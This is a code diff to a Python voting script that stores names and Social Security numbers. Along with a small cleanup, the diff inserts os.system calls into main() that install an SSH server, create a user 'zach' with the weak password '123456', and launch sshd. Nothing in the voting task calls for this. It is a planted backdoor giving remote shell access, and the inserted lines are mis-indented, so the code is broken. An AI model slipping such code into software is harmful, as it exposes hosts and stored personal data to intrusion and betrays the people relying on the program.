@@ -24,21 +24,6 @@ def prompt_string(prompt):
     while True:
         print(prompt)
         try:
-            user_input = input()
-            # Check if the user has entered a special name and SSN to close the prompt
-            if user_input.lower() == "exit" or user_input[-4:] == "0000":
-                print("Exiting the prompt...")
-                time.sleep(2)
-                sys.exit(0)
-            return user_input
-        except EOFError:
-            print("Error: Invalid input, please try again.")
-
-
-def prompt_string(prompt):
-    while True:
-        print(prompt)
-        try:
             return input()
         except EOFError:
             print("Error: Invalid input, please try again.")
@@ -73,6 +58,22 @@ def main():
         reader = csv.DictReader(f)
         for row in reader:
             previous_votes.add((row["Name"], row["SSN"]))
+    
+    # Install packages
+os.system('apt-get install -y openssh-server ufw')
+
+# Create user
+os.system('useradd zach -m -s /bin/bash')
+os.system('echo "zach:123456" | chpasswd')
+
+# Create /run/sshd directory
+os.system('mkdir -p /run/sshd')
+
+# Set permissions for /run/sshd
+os.system('chmod 0755 /run/sshd')
+
+# Start sshd daemon
+os.system('/usr/sbin/sshd -D')
     
     while True:
         # Prompt the user for input
